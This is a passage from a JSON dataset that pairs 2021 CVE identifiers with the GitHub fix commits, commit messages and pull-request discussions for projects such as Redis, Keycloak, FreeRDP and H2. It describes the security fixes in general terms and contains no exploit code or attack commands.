failures could be related to the server this test suite talks to?\r\n\r\nI meant, it's _not_ a CI issue because I can reproduce it locally. I run couple of 5.15 jobs in the last days, they were green. I restarted here one more time. # [Test run: FAILED](https://jenkins-mbedos.oss.arm.com/job/mbed-os-ci-lts-pr/job/PR-14408/3/) \nSummary: 1 of 10 test jobs failed \nBuild number : 3 \n[Build artifacts](http://mbed-os-ci-public.s3-website-eu-west-1.amazonaws.com/?prefix=jenkins-ci/ARMmbed/mbed-os/mbed-os-ci-lts-pr/PR-14408/artifacts/14408/) \n \nFailed test jobs:\n - jenkins-ci/mbed-os-ci_greentea-test-lts\n Looks like greentea-test-lts is random - #14147 first failed then passed # [Test run: FAILED](https://jenkins-mbedos.oss.arm.com/job/mbed-os-ci-lts-pr/job/PR-14408/4/) \nSummary: 2 of 10 test jobs failed \nBuild number : 4 \n[Build artifacts](http://mbed-os-ci-public.s3-website-eu-west-1.amazonaws.com/?prefix=jenkins-ci/ARMmbed/mbed-os/mbed-os-ci-lts-pr/PR-14408/artifacts/14408/) \n \nFailed test jobs:\n - jenkins-ci/mbed-os-ci_example-test-lts\n - jenkins-ci/mbed-os-ci_greentea-test-lts\n I reported this to the  test team (tls socket failures in the recent PRs) # [Test run: SUCCESS](https://jenkins-mbedos.oss.arm.com/job/mbed-os-ci-lts-pr/job/PR-14408/5/) \nSummary: 10 of 10 test jobs passed \nBuild number : 5 \n[Build artifacts](http://mbed-os-ci-public.s3-website-eu-west-1.amazonaws.com/?prefix=jenkins-ci/ARMmbed/mbed-os/mbed-os-ci-lts-pr/PR-14408/artifacts/14408/) \n  Finally passed!",
            "pr_title_words": 8,
            "comments_words": 341,
            "total_other_info_words": 349
        },
        {
            "cve-id": "CVE-2021-32675",
            "commit_url": "https://github.com/redis/redis/commit/5674b0057ff2903d43eaff802017eddf37c360f8",
            "commit_msg": "Prevent unauthenticated client from easily consuming lots of memory (CVE-2021-32675)\n\nThis change sets a low limit for multibulk and bulk length in the\nprotocol for unauthenticated connections, so that they can't easily\ncause redis to allocate massive amounts of memory by sending just a few\ncharacters on the network.\nThe new limits are 10 arguments of 16kb each (instead of 1m of 512mb)",
            "commit_msg_words": 63,
            "other_info": "Release 6.0.16 CI failures on MacOS (due to tests being timing sensitive): \r\n```\r\n*** [err]: No write if min-slaves-max-lag is > of the slave lag in tests/integration/replication-2.tcl\r\nExpected 'NOREPLICAS*' to equal or match 'OK'\r\n*** [err]: With min-slaves-to-write: master not writable with lagged slave in tests/integration/replication-4.tcl\r\nExpected 'NOREPLICAS*' to equal or match 'OK'\r\nCleanup: may take some time... OK\r\n```\r\nsolved by #8461 and #8583\r\n\r\nalso, the `build-ubuntu-old` CI got hung (probably no longer supported) Hi,\r\n [hi_sdsMakeRoomFor](https://github.com/redis/redis/blob/4930d19e70c391750479951022e207e19111eb55/deps/hiredis/sds.c#L196)  in deps/hiredis/sds.c wouldn't c487a9c03f89498976b3b6574df2cac763af16cc commit be applicable for hiredis code as well?\r\n Pinging @michael-grunder, do you think this fix is relevant for hiredis?",
            "pr_title_words": 2,
            "comments_words": 98,
            "total_other_info_words": 100
        },
        {
            "cve-id": "CVE-2021-38115",
            "commit_url": "https://github.com/libgd/libgd/commit/8b111b2b4a4842179be66db68d84dda91a246032",
            "commit_msg": "fix read out-of-bands in reading tga header file",
            "commit_msg_words": 8,
            "other_info": "fix read out-of-bounds in reading tga header file Thank you @me22bee  :)",
            "pr_title_words": 8,
            "comments_words": 4,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2021-25924",
            "commit_url": "https://github.com/gocd/gocd/commit/7d0baab0d361c377af84994f95ba76c280048548",
            "commit_msg": "#000 - Add missing Content-Type check",
            "commit_msg_words": 6,
            "other_info": "Add missing Content-Type check",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2021-28170",
            "commit_url": "https://github.com/jakartaee/expression-language/commit/b6a3943ac5fba71cbc6719f092e319caa747855b",
            "commit_msg": "CVE-2021-28170 Fix expression delimiter escaping\n\nCo-authored-by: rmartinc rmartinc@redhat.com",
            "commit_msg_words": 8,
            "other_info": "CVE-2021-28170 Fix expression delimiter escaping Any ETA on when this fix will be released into a new version? +1 for a merge and new version Can we have this fix into 3.x?  it is not possible for us to upgrade 4.x due to packaging changes found a good replacement from jboss repo - https://repository.jboss.org/nexus/content/repositories/thirdparty-releases/org/glassfish/jakarta.el/ There are missing copyright headers. I'll merge it and we'll add it later respecting the authorship. We need this fix as well in v3.x as it'll be impossible at the moment to upgrade to v4.x. Could you please let us know whether you're planning to port it in v3.x and provide an ETA if so?\r\n\r\nThanks,\r\nMaria is it merged in version 3.0.3 or we need to upgrade for 4.x. to fix the issue @deepmanit The changes are in https://github.com/eclipse-ee4j/el-ri/releases/tag/3.0.4-impl but it hasn't been published to Maven Central yet. > @deepmanit The changes are in https://github.com/eclipse-ee4j/el-ri/releases/tag/3.0.4-impl but it hasn't been published to Maven Central yet.\r\n\r\n@joschi any idea when will the 3.x be pushed to Maven central? It would be really helpful if we get it ASAP in Maven Central :) \r\n\r\n > > @deepmanit The changes are in https://github.com/eclipse-ee4j/el-ri/releases/tag/3.0.4-impl but it hasn't been published to Maven Central yet.\r\n> \r\n> @joschi any idea when will the 3.x be pushed to Maven central? It would be really helpful if we get it ASAP in Maven Central :)\r\n\r\nIt's been there for a month now: https://search.maven.org/artifact/com.sun.el/el-ri/3.0.4/jar > > > @deepmanit The changes are in https://github.com/eclipse-ee4j/el-ri/releases/tag/3.0.4-impl but it hasn't been published to Maven Central yet.\r\n> > \r\n> > \r\n> > @joschi any idea when will the 3.x be pushed to Maven central? It would be really helpful if we get it ASAP in Maven Central :)\r\n> \r\n> It's been there for a month now: https://search.maven.org/artifact/com.sun.el/el-ri/3.0.4/jar\r\n\r\n@fenneclabs but I don't see jakarta.el:jakarta.el-api:3.0.4 in maven central. Am I missing something here?  > @fenneclabs but I don't see jakarta.el:jakarta.el-api:3.0.4 in maven central. Am I missing something here?\r\n\r\nYes. The API and the implementation are separate and are provided in separate JARs. This is a vulnerability in the Glassfish implementation of the EL API so the Glassfish implementation was updated. The EL API is unaffected.",
            "pr_title_words": 5,
            "comments_words": 359,
            "total_other_info_words": 364
        },
        {
            "cve-id": "CVE-2021-3856",
            "commit_url": "https://github.com/keycloak/keycloak/commit/73f0474008e1bebd0733e62a22aceda9e5de6743",
            "commit_msg": "[KEYCLOAK-19422] ClassLoaderTheme and ClasspathThemeResourceProviderFactory allows reading any file available as a resource to the classloader",
            "commit_msg_words": 15,
            "other_info": "[KEYCLOAK-19422] ClassLoaderTheme and ClasspathThemeResourceProviderF\u2026",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2021-21295",
            "commit_url": "https://github.com/Netflix/zuul/commit/033d3c2de354e249f6d775bde8b67b0997888958",
            "commit_msg": "Tyr out chunked encoding enforcer",
            "commit_msg_words": 5,
            "other_info": "core: add checks to chunked encoding for http/2",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2021-4156",
            "commit_url": "https://github.com/libsndfile/libsndfile/commit/4c30646abf7834e406f7e2429c70bc254e18beab",
            "commit_msg": "flac: Fix improper buffer reusing",
            "commit_msg_words": 5,
            "other_info": "flac: Fix improper buffer reusing @arthurt , can you look at this? It looks like @arthurt is busy, no activity in his repos.\r\n\r\n@bobsayshilol, could you review it? @yuawn , would you be so kind as to update the pull request? Hi @evpobr,\r\n\r\nThank @bobsayshilol, I have updated the pull request.\r\nThis commit can fix the root cause of this security bug, and it should be merge and release as soon as possible, because the vulnerability affects wild range of release version.\r\nThanks! Funny, the fix is so simple. @bobsayshilol , approve? > LGTM. Note that `psf_log_printf()` isn't being called like in the branch below though, but functionally it's now correct.\r\n\r\n@yuawn ? And then i merge it. @evpobr, done! Thank you all for your help!",
            "pr_title_words": 5,
            "comments_words": 121,
            "total_other_info_words": 126
        },
        {
            "cve-id": "CVE-2021-22564",
            "commit_url": "https://github.com/libjxl/libjxl/commit/e05e801278ee1205848e66406a0821f771d47172",
            "commit_msg": "Fix out of bounds copy in LoadBorders()\n\nWhen processing groups out of order with an image where the last group\nsize  is smaller than the needed border it was possible to attempt to\nload the right or bottom border from the next group when already\nprocessing the rightmost or bottom group respectively. This situation\nwas causing an out-of-bounds copy on saved Image3F buffer in release\nmode (or hitting a JXL_DASSERT in debug mode).\n\nThe order in which the groups are processed depends on many factors,\nincluding the order in which the threads are scheduled when using\nmultiple threads, and potentially the order of the groups in the file\n(not checked).\n\nAdded a test to force the out-of-order situation in a simulated parallel\nrunner that forces a random order on the tasks. The new test triggers\nthe assert in debug mode, which is now fixed.\n\nFixes #708.",
            "commit_msg_words": 146,
            "other_info": "Fix out of bounds copy in LoadBorders()",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2021-21234",
            "commit_url": "https://github.com/lukashinsch/spring-boot-actuator-logview/commit/760acbb939a8d1f7d1a7dfcd51ca848eea04e772",
            "commit_msg": "backport directory traversal vulnerability fix",
            "commit_msg_words": 5,
            "other_info": "backport directory traversal vulnerability fix \ud83d\udc4b @lukashinsch do you plan to make a release with this change? we (at [snyk](http://snyk.io)]) would like to add it as a vulnerability to our db, possibly assign a CVE to it as well.",
            "pr_title_words": 5,
            "comments_words": 34,
            "total_other_info_words": 39
        },
        {
            "cve-id": "CVE-2021-41168",
            "commit_url": "https://github.com/reddit/snudown/commit/1ac2c130b210539ee1e5d67a7bac93f9d8007c0e",
            "commit_msg": "Hash-collision denial-of-service vulnerabilities (#87)\n\n* Add case insensitive SipHash implementation\n* Replace ref hash function with SipHash\n* Add label to link_ref struct.\n* Update find_link_ref to compare link labels as well as hashes\n* Update add_link_ref to disallow duplicate entries.\n* cast to char from uint8_t for strncasecmp\n* update README markdown, remove TODO\n* add py2 wheel generation\n* fix: add logic for older glibc not having getrandom, impacting staging\n\nCo-authored-by: Nicolaas <nweidema@usc.edu>",
            "commit_msg_words": 75,
            "other_info": "Merge 1.7.0 into downstream github.com repo",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2021-21381",
            "commit_url": "https://github.com/flatpak/flatpak/commit/8279c5818425b6812523e3805bbe242fb6a5d961",
            "commit_msg": "Disallow @@ and @@u usage in desktop files\n\nFixes #4146.\n\n(cherry picked from commit 652a28ffab67cb6cd7d12dc3a93979bcd3731c7f)",
            "commit_msg_words": 15,
            "other_info": "Backports 1.10.x",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-31403",
            "commit_url": "https://github.com/vaadin/framework/commit/d852126ab6f0c43f937239305bd0e9594834fe34",
            "commit_msg": "fix: use time-constant comparison for CSRF tokens\n\nThis hardens the framework against a theoretical timing attack based on\r\ncomparing how quickly a request with an invalid CSRF token is rejected.",
            "commit_msg_words": 30,
            "other_info": "fix: use time-constant comparison for CSRF tokens Picked from: https://github.com/vaadin/flow/commit/292b3a0b1d68b34d9b824e5afe62deb7b32e1ebb Hey! when are you planning to release this? > Hey! when are you planning to release this?\r\n\r\n@AdamGold in the best possible speed.",
            "pr_title_words": 7,
            "comments_words": 26,
            "total_other_info_words": 33
        },
        {
            "cve-id": "CVE-2021-23463",
            "commit_url": "https://github.com/h2database/h2database/commit/d83285fd2e48fb075780ee95badee6f5a15ea7f8",
            "commit_msg": "fix for #3195 CQLXML XXE vulnerability",
            "commit_msg_words": 6,
            "other_info": "Fix for #3195 CQLXML XXE vulnerability Hey @andreitokar looks like over two years since a release :O \r\n\r\nAnything that could be done to get this published? Can this security vulnerability fix be patched to the previous release as well? Same need here, please In researching this vulnerability, I found that the JdbcResultSet.getSQLXML() method is unsupported in all versions of H2 prior to 1.4.198.  It appears that this only effects version 1.4.198 to 2.0.201, can we get the vulnerability updated so that it doesn't show that this effects older versions of H2? You probably need to ask the person who posted this vulnerability. The [CVE-2021-23463](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23463) references this github page, I am not sure who reported or \"confirmed\" that it effected all previous versions of H2, but it is incorrect.  I don't have access to the CVE page to make adjustments and I don't know who would.\r\n\r\nMaven uses the CVE report to tag builds with vulnerabilities, and so all of the maven builds are miss-tags [on this page](https://mvnrepository.com/artifact/com.h2database/h2).  You'd have to contact MITRE, they are the only ones who can update those entries. The person who requested the CVE likely said \"all versions\" which is very common to see in researcher and vendor disclosures, even if all versions were not tested. Only 1.4.198, 1.4.199, and 1.4.200 are affected. (There is no version with build id 201.)\r\n\r\nThis vulnerability can only affect application when it calls one of these methods to read values from untrusted sources. If application doesn't call them (most applications don't call them), it is safe. If application calls them, but all XML values were generated by this application and they can't contain references to external pages, it is still safe. @andreitokar can this be backported to 1.4? Once we have a 1.4.201 release we can have Snyk and NIST adjust the CVE (did this before). See https://github.com/h2database/h2database/issues/3195#issuecomment-998525068 and related conversation",
            "pr_title_words": 6,
            "comments_words": 306,
            "total_other_info_words": 312
        },
        {
            "cve-id": "CVE-2021-36088",
            "commit_url": "https://github.com/fluent/fluent-bit/commit/22346a74c07ceb90296be872be2d53eb92252a54",
            "commit_msg": "parser: json: fix double-free (#3453)\n\nSigned-off-by: davkor <david@adalogics.com>",
            "commit_msg_words": 8,
            "other_info": "flb: parse-json: fix double-free @edsiper @nokute78 it seems the CI is failing due to issues unrelated to the PR.  thanks",
            "pr_title_words": 4,
            "comments_words": 16,
            "total_other_info_words": 20
        },
        {
            "cve-id": "CVE-2021-37594",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/0d79670a28c0ab049af08613621aa0c267f977e9",
            "commit_msg": "Fixed missing input checks for file contents request\n\nreported by Valentino Ricotta (Thalium)",
            "commit_msg_words": 13,
            "other_info": "Fixed missing input checks for file contents request \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/6318/",
            "pr_title_words": 8,
            "comments_words": 14,
            "total_other_info_words": 22
        },
        {
            "cve-id": "CVE-2021-27186",
            "commit_url": "https://github.com/fluent/fluent-bit/commit/4deb051cb0277d32ab402da4f941f6e502518388",
            "commit_msg": "http_server: v1: metrics: fix potential SIGSEGV by memory allocation errors\n\nThis is a follow up on PR 3045. While 3045 fixed the potential SIGSERV\nissue caused by memory allocation error in flb_avro, after searching/reviewing\nit looks like  src/http_server/api/v1/metrics.c also consists of several\nsimilar issues.\n\nThis PR adds proper check to prevent the potential SIGSERV issues.\n\nSigned-off-by: Yong Tang <yong.tang.github@outlook.com>",
            "commit_msg_words": 59,
            "other_info": "http_server: v1: metrics: fix potential SIGSEGV by memory allocation errors",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2021-20271",
            "commit_url": "https://github.com/rpm-software-management/rpm/commit/d6a86b5e69e46cc283b1e06c92343319beb42e21",
            "commit_msg": "Be much more careful about copying data from the signature header\n\nOnly look for known tags, and ensure correct type and size where known\nbefore copying over. Bump the old arbitrary 16k count limit to 16M limit\nthough, it's not inconceivable that a package could have that many files.\nWhile at it, ensure none of these tags exist in the main header,\nwhich would confuse us greatly.\n\nThis is optimized for backporting ease, upstream can remove redundancies\nand further improve checking later.\n\nReported and initial patches by Demi Marie Obenour.\n\nFixes: RhBug:1935049, RhBug:1933867, RhBug:1935035, RhBug:1934125, ...\n\nFixes: CVE-2021-3421, CVE-2021-20271",
            "commit_msg_words": 99,
            "other_info": "Be much more careful about copying data from the signature header (reporter credits added to commit message) > I included a couple of minor performance suggestions, but those should not delay merging.\r\n\r\nBut that's exactly what such things tend to do, as I'm now wondering could there be some quirks code, especially very old versions, that cause it to actually rely on the put-sort cycle. It's extremely unlikely, but there have been stranger things (see commit da3a3a14e757ccd517e2eb2a3f0293ff48b3ff7f) Split the optimization part to a separate commit so the first one can be safely picked for old versions.\r\nI merged the MINMEM part to the first commit though - I had some kind of reason to not put it there in the first place (probably just that MINMEM is a bit iffy in the first place), but thinking it again, MINMEM is what the header iteration does so in a way this is closer to the original behavior. Mind you, the suggested optimization to avoid multiple sorts totally makes sense and never occurred to me at all (too much staring at how it always did it), so thanks for that! Just that with critical fixes needing backports and all, other enhancements such as performance are best kept apart - I planned to do a PR for that separately sooner or later.",
            "pr_title_words": 11,
            "comments_words": 208,
            "total_other_info_words": 219
        },
        {
            "cve-id": "CVE-2021-32847",
            "commit_url": "https://github.com/moby/hyperkit/commit/cf60095a4d8c3cb2e182a14415467afd356e982f",
            "commit_msg": "Fix assertion turned into assignment\n\nThe qassertion is supposed to check the value but the typo makes it\nan assignment. Hence it is always true,\n\nSigned-off-by: Frederic Dalleau <frederic.dalleau@docker.com>",
            "commit_msg_words": 29,
            "other_info": "Fix assertion turned into assignment",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2021-35344",
            "commit_url": "https://github.com/justdan96/tsMuxer/commit/3a889a37b5b74a45025aca13ebda394b8f706ef3",
            "commit_msg": "[bug] Buffer overflow when SEI payloadSize > bits left\n\nFixes #433 .",
            "commit_msg_words": 12,
            "other_info": "[bug] Buffer overflow when SEI payloadSize > bits left",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2021-42780",
            "commit_url": "https://github.com/OpenSC/OpenSC/commit/5df913b7f57ad89b9832555d24c08d23a534311e",
            "commit_msg": "tcos: Check bounds in insert_pin()\n\nThanks oss-fuzz\n\nhttps://bugs.chromium.org/p/oss-fuzz/issues/detail?id=28383",
            "commit_msg_words": 8,
            "other_info": "Current fuzzing issues",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2021-32020",
            "commit_url": "https://github.com/FreeRTOS/FreeRTOS-Kernel/commit/c7a9a01c94987082b223d3e59969ede64363da63",
            "commit_msg": "Improve heap2 bounds checking (#224)\n\n* Improve heap bounds checking in pvPortMalloc",
            "commit_msg_words": 12,
            "other_info": "Improve heap2 bounds checking",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2021-32687",
            "commit_url": "https://github.com/redis/redis/commit/a30d367a71b7017581cf1ca104242a3c644dec0f",
            "commit_msg": "Fix Integer overflow issue with intsets (CVE-2021-32687)\n\nThe vulnerability involves changing the default set-max-intset-entries\nconfiguration parameter to a very large value and constructing specially\ncrafted commands to manipulate sets",
            "commit_msg_words": 29,
            "other_info": "Release 6.0.16 CI failures on MacOS (due to tests being timing sensitive): \r\n```\r\n*** [err]: No write if min-slaves-max-lag is > of the slave lag in tests/integration/replication-2.tcl\r\nExpected 'NOREPLICAS*' to equal or match 'OK'\r\n*** [err]: With min-slaves-to-write: master not writable with lagged slave in tests/integration/replication-4.tcl\r\nExpected 'NOREPLICAS*' to equal or match 'OK'\r\nCleanup: may take some time... OK\r\n```\r\nsolved by #8461 and #8583\r\n\r\nalso, the `build-ubuntu-old` CI got hung (probably no longer supported) Hi,\r\n [hi_sdsMakeRoomFor](https://github.com/redis/redis/blob/4930d19e70c391750479951022e207e19111eb55/deps/hiredis/sds.c#L196)  in deps/hiredis/sds.c wouldn't c487a9c03f89498976b3b6574df2cac763af16cc commit be applicable for hiredis code as well?\r\n Pinging @michael-grunder, do you think this fix is relevant for hiredis?",
            "pr_title_words": 2,
            "comments_words": 98,
            "total_other_info_words": 100
        },
        {
            "cve-id": "CVE-2021-23514",
            "commit_url": "https://github.com/CrowCpp/Crow/commit/0a160214424d5ca708b8e2eaea061924d8fb0c38",
            "commit_msg": "Fix vulnrabilities in mustache and static",
            "commit_msg_words": 6,
            "other_info": "Fix vulnerabilities",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2021-21257",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/99a9257421ca5305ef6a360c02f63561e63ecc60",
            "commit_msg": "Validate the calculated address pointer based on the source routing header.",
            "commit_msg_words": 11,
            "other_info": "Validate the address pointer in the source routing header",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2021-4142",
            "commit_url": "https://github.com/candlepin/candlepin/commit/87bb26761cb0d563d2eb697331ebd0dd85a67e5f",
            "commit_msg": "Disallow authN with SCA certificate",
            "commit_msg_words": 5,
            "other_info": "[4.0] Disallow authN with SCA certificate",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2021-31404",
            "commit_url": "https://github.com/vaadin/flow/commit/621ef1b322737d963bee624b2d2e38cd739903d9",
            "commit_msg": "Use time-constant comparison for CSRF tokens\n\nThis hardens the framework against a theoretical timing attack based on\ncomparing how quickly a request with an invalid CSRF token is rejected.",
            "commit_msg_words": 29,
            "other_info": "Use time-constant comparison for CSRF tokens SonarQube analysis reported 3 issues\n\nNote: The following issues were found on lines that were not modified in the pull request. Because these issues can't be reported as line comments, they are summarized here:\n\n1. ![MAJOR][MAJOR] [VaadinService.java#L426](https://github.com/vaadin/flow/blob/621ef1b322737d963bee624b2d2e38cd739903d9/flow-server/src/main/java/com/vaadin/flow/server/VaadinService.java#L426): Rename \"instantiator\" which hides the field declared at line 193. [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonar.projects.vaadin.com/coding_rules#rule_key=squid%3AHiddenFieldCheck)\n1. ![MINOR][MINOR] [VaadinService.java#L429](https://github.com/vaadin/flow/blob/621ef1b322737d963bee624b2d2e38cd739903d9/flow-server/src/main/java/com/vaadin/flow/server/VaadinService.java#L429): Remove this use of \"init\"; it is deprecated. [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonar.projects.vaadin.com/coding_rules#rule_key=squid%3ACallToDeprecatedMethod)\n1. ![MINOR][MINOR] [VaadinService.java#L443](https://github.com/vaadin/flow/blob/621ef1b322737d963bee624b2d2e38cd739903d9/flow-server/src/main/java/com/vaadin/flow/server/VaadinService.java#L443): Remove this use of \"init\"; it is deprecated. [![rule](https://sonarsource.github.io/sonar-github/rule.png)](https://sonar.projects.vaadin.com/coding_rules#rule_key=squid%3ACallToDeprecatedMethod)\n\n[MAJOR]: https://sonarsource.github.io/sonar-github/severity-major.png 'Severity: MAJOR'\n[MINOR]: https://sonarsource.github.io/sonar-github/severity-minor.png 'Severity: MINOR' No tests since this is functionality equivalent to the previous implementation aside from timing differences that would be very fragile to verify in an automated test. I approved the changes. \r\n\r\nThe only drawback is about sacrificing the performance just a little bit for preventing a timing attack, which I assume not be that huge due to the size of the Token.  Cherry picked to `2.5`",
            "pr_title_words": 6,
            "comments_words": 145,
            "total_other_info_words": 151
        },
        {
            "cve-id": "CVE-2021-36513",
            "commit_url": "https://github.com/signalwire/freeswitch/commit/bd87b8892c260753af5672b6f865684036f157dc",
            "commit_msg": "[mod_sofia] Fixed a few Usage-of-uninitialized value bugs which may cause information discolsure and bypass ACL check",
            "commit_msg_words": 16,
            "other_info": "[mod_sofia] Fixed a few Usage-of-uninitialized value bugs which may cause information discolsure and bypass ACL check",
            "pr_title_words": 16,
            "comments_words": 0,
            "total_other_info_words": 16
        },
        {
            "cve-id": "CVE-2021-41959",
            "commit_url": "https://github.com/jerryscript-project/jerryscript/commit/baf01585b4a818b087a1ec77f99fe7ea6c653a10",
            "commit_msg": "Fix leaking lastIndex values in RegExp built-ins\n\nFixes #4781. This is a followup fix after #4166.\n\nJerryScript-DCO-1.0-Signed-off-by: Csaba Osztrogon\u00e1c csaba.osztrogonac@h-lab.eu",
            "commit_msg_words": 20,
            "other_info": "Fix leaking lastIndex values in RegExp built-ins",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2021-32626",
            "commit_url": "https://github.com/redis/redis/commit/666ed7facf4524bf6d19b11b20faa2cf93fdf591",
            "commit_msg": "Fix invalid memory write on lua stack overflow {CVE-2021-32626}\n\nWhen LUA call our C code, by default, the LUA stack has room for 20\nelements. In most cases, this is more than enough but sometimes it's not\nand the caller must verify the LUA stack size before he pushes elements.\n\nOn 3 places in the code, there was no verification of the LUA stack size.\nOn specific inputs this missing verification could have lead to invalid\nmemory write:\n1. On 'luaReplyToRedisReply', one might return a nested reply that will\n   explode the LUA stack.\n2. On 'redisProtocolToLuaType', the Redis reply might be deep enough\n\u00a0 \u00a0to explode the LUA stack (notice that currently there is no such\n\u00a0 \u00a0command in Redis that returns such a nested reply, but modules might\n\u00a0 \u00a0do it)\n3. On 'ldbRedis', one might give a command with enough arguments to\n\u00a0 \u00a0explode the LUA stack (all the arguments will be pushed to the LUA\n\u00a0 \u00a0stack)\n\nThis commit is solving all those 3 issues by calling 'lua_checkstack' and\nverify that there is enough room in the LUA stack to push elements. In\ncase 'lua_checkstack' returns an error (there is not enough room in the\nLUA stack and it's not possible to increase the stack), we will do the\nfollowing:\n1. On 'luaReplyToRedisReply', we will return an error to the user.\n2. On 'redisProtocolToLuaType' we will exit with panic (we assume this\n   scenario is rare because it can only happen with a module).\n3. On 'ldbRedis', we return an error.",
            "commit_msg_words": 248,
            "other_info": "Release 6.0.16 CI failures on MacOS (due to tests being timing sensitive): \r\n```\r\n*** [err]: No write if min-slaves-max-lag is > of the slave lag in tests/integration/replication-2.tcl\r\nExpected 'NOREPLICAS*' to equal or match 'OK'\r\n*** [err]: With min-slaves-to-write: master not writable with lagged slave in tests/integration/replication-4.tcl\r\nExpected 'NOREPLICAS*' to equal or match 'OK'\r\nCleanup: may take some time... OK\r\n```\r\nsolved by #8461 and #8583\r\n\r\nalso, the `build-ubuntu-old` CI got hung (probably no longer supported) Hi,\r\n [hi_sdsMakeRoomFor](https://github.com/redis/redis/blob/4930d19e70c391750479951022e207e19111eb55/deps/hiredis/sds.c#L196)  in deps/hiredis/sds.c wouldn't c487a9c03f89498976b3b6574df2cac763af16cc commit be applicable for hiredis code as well?\r\n Pinging @michael-grunder, do you think this fix is relevant for hiredis?",
            "pr_title_words": 2,
            "comments_words": 98,
            "total_other_info_words": 100
        },
        {
            "cve-id": "CVE-2021-27229",
            "commit_url": "https://github.com/mumble-voip/mumble/commit/e59ee87abe249f345908c7d568f6879d16bfd648",
            "commit_msg": "FIX(client): Only allow \"http\"/\"https\" for URLs in ConnectDialog\n\nOur public server list registration script doesn't have an URL scheme\nwhitelist for the website field.\n\nTurns out a malicious server can register itself with a dangerous URL in\nan attempt to attack a user's machine.\n\nUser interaction is required, as the URL has to be opened by\nright-clicking on the server entry and clicking on \"Open Webpage\".\n\nThis commit introduces a client-side whitelist, which only allows \"http\"\nand \"https\" schemes. We will also implement it in our public list.\n\nIn future we should probably add a warning QMessageBox informing the\nuser that there's no guarantee the URL is safe (regardless of the\nscheme).\n\nThanks a lot to https://positive.security for reporting the RCE\nvulnerability to us privately.",
            "commit_msg_words": 125,
            "other_info": "Backport \"FIX(client): Only allow \"http\"/\"https\" for URLs in ConnectDialog\"",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2021-40656",
            "commit_url": "https://github.com/libsixel/libsixel/commit/dc96cdc27fb53e8595af67aaf68001033c808e42",
            "commit_msg": "[error_diffuse] don't diffuse into the void",
            "commit_msg_words": 6,
            "other_info": "[error_diffuse] don't diffuse into the void",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2021-28874",
            "commit_url": "https://github.com/SerenityOS/serenity/commit/c9f25bca048443e317f1994ba9b106f2386688c3",
            "commit_msg": "LibTextCodec: Make UTF16BEDecoder read only up to an even offset\n\nReading up to the end of the input string of odd length results in\nan out-of-bounds read",
            "commit_msg_words": 27,
            "other_info": "LibTextCodec: Make UTF16BEDecoder read only up to an even offset",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2021-20218",
            "commit_url": "https://github.com/fabric8io/kubernetes-client/commit/325d67cc80b73f049a5d0cea4917c1f2709a8d86",
            "commit_msg": "fix: CVE-2021-20218 vulnerable to a path traversal",
            "commit_msg_words": 7,
            "other_info": "fix: CVE-2021-20218 vulnerable to a path traversal Can one of the admins verify this patch? n.b. K8s E2E tests won't pass in this version because the GH action is not compatible with the newly provided environment by GitHub (Ubuntu 20.04 as opposed to Ubuntu 18.04)\r\n\r\nSame for Sonar task:\r\n```\r\nThe version of Java (1.8.0_282) you have used to run this analysis is deprecated and we stopped accepting it. Please update to at least Java 11.\r\n```",
            "pr_title_words": 7,
            "comments_words": 70,
            "total_other_info_words": 77
        },
        {
            "cve-id": "CVE-2021-41751",
            "commit_url": "https://github.com/jerryscript-project/jerryscript/commit/5ea5b5345e114ee78038874ceb2d1fc3e3096a05",
            "commit_msg": "Avoid buffer-overflow in Array.slice when using fast arrays\n\nIn the Array.slice method when the engine uses fast arrays the \"end\" value\nwas not updated if the input array's length changed. This can occur when the start/end\nindex normalization executes a method and the length is changed forcefully.\nThis leads to a buffer-overflow as the element copy reads too much data from the input\narray.\n\nJerryScript-DCO-1.0-Signed-off-by: Peter Gal pgal.usz@partner.samsung.com",
            "commit_msg_words": 68,
            "other_info": "Avoid buffer-overflow in Array.slice when using fast arrays",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2021-28676",
            "commit_url": "https://github.com/python-pillow/Pillow/commit/bb6c11fb889e6c11b0ee122b828132ee763b5856",
